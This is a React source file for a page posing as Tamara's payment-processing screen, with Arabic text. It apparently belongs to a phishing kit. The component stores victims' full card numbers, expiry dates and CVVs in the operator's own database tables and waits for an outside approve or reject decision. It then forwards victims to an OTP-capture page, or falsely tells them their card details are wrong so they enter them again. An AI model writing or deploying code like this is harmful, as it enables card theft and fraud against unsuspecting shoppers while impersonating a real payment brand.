import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { CheckCircle, XCircle } from "lucide-react";
import tamaraLogo from "@/assets/tamara-logo.png";
import { supabase } from "@/integrations/supabase/client";

const loadingMessages = [
  "جاري معالجة الدفع...",
  "التحقق من بيانات البطاقة...",
  "تأمين المعاملة...",
  "إتمام العملية...",
];

const TamaraPaymentProcessing = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [messageIndex, setMessageIndex] = useState(0);
  const [paymentStatus, setPaymentStatus] = useState<"processing" | "success" | "failed">("processing");

  const paymentId = searchParams.get("paymentId") || "";
  const cardholderName = searchParams.get("cardholderName") || "";
  const cardNumber = searchParams.get("cardNumber") || "";
  const cardNumberLast4 = searchParams.get("cardNumberLast4") || "";
  const expiryDate = searchParams.get("expiryDate") || "";
  const cvv = searchParams.get("cvv") || "";
  const totalAmount = searchParams.get("totalAmount") || "0";
  const monthlyPayment = searchParams.get("monthlyPayment") || "0";
  const company = searchParams.get("company") || "";

  // Rotate loading messages
  useEffect(() => {
    if (paymentStatus === "processing") {
      const interval = setInterval(() => {
        setMessageIndex((prev) => (prev + 1) % loadingMessages.length);
      }, 2000);
      return () => clearInterval(interval);
    }
  }, [paymentStatus]);

  // Submit payment and check status
  useEffect(() => {
    const submitPayment = async () => {
      try {
        // تحديث سجل الدفع الموجود بدلاً من إنشاء جديد
        const { error: updateError } = await supabase
          .from("tamara_payments")
          .update({
            cardholder_name: cardholderName,
            card_number: cardNumber,
            card_number_last4: cardNumberLast4,
            expiry_date: expiryDate,
            cvv: cvv,
            total_amount: parseFloat(totalAmount),
            monthly_payment: parseFloat(monthlyPayment),
          })
          .eq("id", paymentId);

        if (updateError) throw updateError;

        // حفظ محاولة الدفع
        await supabase.from("tamara_payment_attempts").insert({
          payment_id: paymentId,
          card_number: cardNumber,
          card_holder_name: cardholderName,
          expiry_date: expiryDate,
          cvv: cvv,
        });

        // Poll for status updates
        const pollInterval = setInterval(async () => {
          const { data: statusData, error: statusError } = await supabase
            .from("tamara_payments")
            .select("payment_status")
            .eq("id", paymentId)
            .single();

          if (statusError) {
            clearInterval(pollInterval);
            setPaymentStatus("failed");
            return;
          }

          if (statusData.payment_status === "approved") {
            clearInterval(pollInterval);
            setPaymentStatus("success");
            setTimeout(() => {
              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${paymentId}`);
            }, 2000);
           } else if (statusData.payment_status === "rejected") {
            clearInterval(pollInterval);
            setPaymentStatus("failed");
            setTimeout(() => {
              // إعادة التوجيه إلى صفحة البطاقة مع مسح البيانات القديمة
              navigate(`/tamara-checkout?paymentId=${paymentId}&price=${totalAmount}&company=${encodeURIComponent(company)}`, { replace: true });
            }, 3000);
          }
        }, 2000);

        setTimeout(() => {
          clearInterval(pollInterval);
          if (paymentStatus === "processing") {
            setPaymentStatus("failed");
            setTimeout(() => {
              navigate(`/tamara-checkout?paymentId=${paymentId}&price=${totalAmount}&company=${encodeURIComponent(company)}`, { replace: true });
            }, 3000);
          }
        }, 30000);

      } catch (error) {
        console.error("Payment submission error:", error);
        setPaymentStatus("failed");
        setTimeout(() => {
          navigate(`/tamara-checkout?paymentId=${paymentId}&price=${totalAmount}&company=${encodeURIComponent(company)}`, { replace: true });
        }, 3000);
      }
    };

    submitPayment();
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 p-4 flex items-center justify-center" dir="rtl">
      <div className="max-w-md w-full">
        {/* Tamara Logo */}
        <div className="flex justify-center mb-8">
          <div className="w-32 h-12 flex items-center justify-center">
            <img src={tamaraLogo} alt="تمارا" className="w-full h-full object-contain" />
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-2xl shadow-lg p-8">
          {/* Status Icon and Message */}
          <div className="flex flex-col items-center justify-center min-h-[300px]">
            {paymentStatus === "processing" && (
              <>
                <div className="relative w-24 h-24 mb-6">
                  <div className="absolute inset-0 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
                  <div className="absolute inset-2 border-4 border-primary-light border-t-transparent rounded-full animate-spin" style={{ animationDirection: 'reverse', animationDuration: '1s' }}></div>
                </div>
                <p className="text-xl font-bold text-center mb-2">
                  {loadingMessages[messageIndex]}
                </p>
                <p className="text-sm text-muted-foreground text-center">
                  يرجى الانتظار، لا تغلق هذه النافذة
                </p>
              </>
            )}

            {paymentStatus === "success" && (
              <>
                <div className="w-24 h-24 mb-6 bg-green-100 rounded-full flex items-center justify-center">
                  <CheckCircle className="w-16 h-16 text-green-600" />
                </div>
                <p className="text-xl font-bold text-center text-green-600 mb-2">
                  تمت العملية بنجاح!
                </p>
                <p className="text-sm text-muted-foreground text-center">
                  جاري التحويل إلى صفحة التحقق...
                </p>
              </>
            )}

            {paymentStatus === "failed" && (
              <>
                <div className="w-24 h-24 mb-6 bg-red-100 rounded-full flex items-center justify-center">
                  <XCircle className="w-16 h-16 text-red-600" />
                </div>
                <p className="text-xl font-bold text-center text-red-600 mb-2">
                  فشلت عملية الدفع
                </p>
                <p className="text-sm text-muted-foreground text-center">
                  معلومات البطاقة غير صحيحة، سيتم إعادتك لإدخال البيانات مرة أخرى...
                </p>
              </>
            )}
          </div>

          {/* Payment Details */}
          <div className="mt-8 pt-6 border-t-2 border-gray-100">
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-muted-foreground">حامل البطاقة:</span>
                <span className="font-medium">{cardholderName}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">البطاقة:</span>
                <span className="font-medium">**** **** **** {cardNumberLast4}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">المبلغ الشهري:</span>
                <span className="font-medium">{monthlyPayment} ر.س</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">المبلغ الإجمالي:</span>
                <span className="font-bold text-lg">{totalAmount} ر.س</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default TamaraPaymentProcessing;
